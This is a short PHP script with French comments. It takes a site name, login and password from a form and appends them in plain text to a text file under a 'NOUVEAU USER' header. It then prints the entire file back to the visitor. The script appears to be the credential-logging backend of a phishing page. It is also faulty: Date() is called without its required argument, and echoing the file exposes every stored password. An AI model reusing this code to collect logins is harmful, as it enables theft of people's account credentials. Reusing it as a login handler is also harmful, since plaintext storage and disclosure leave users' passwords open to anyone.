<?php

$site = $_POST["site"];
$name = $_POST["login"];

$pw = $_POST["password"];
$date = Date();
            
            //On récupère le contenu du fichier
            $texte = file_get_contents('exemple.txt');
                        
                                    //On ajoute notre nouveau texte à l'ancien
                                                $texte .= "\n**NOUVEAU USER**";
                                                $texte .= "\n**site: $site**";
                                                $texte .= "\n**name: $name**";
                                                $texte .= "\n**mot de passe: $pw**";
                                                $texte .= "\n**date: $date**";
                                                $texte .= "\n****";
                                                $texte .= "\n";
						echo $texte;
                                                            
                                                                        //On écrit tout le texte dans notre fichier
                                                                                    file_put_contents('exemple.txt', $texte);


?>
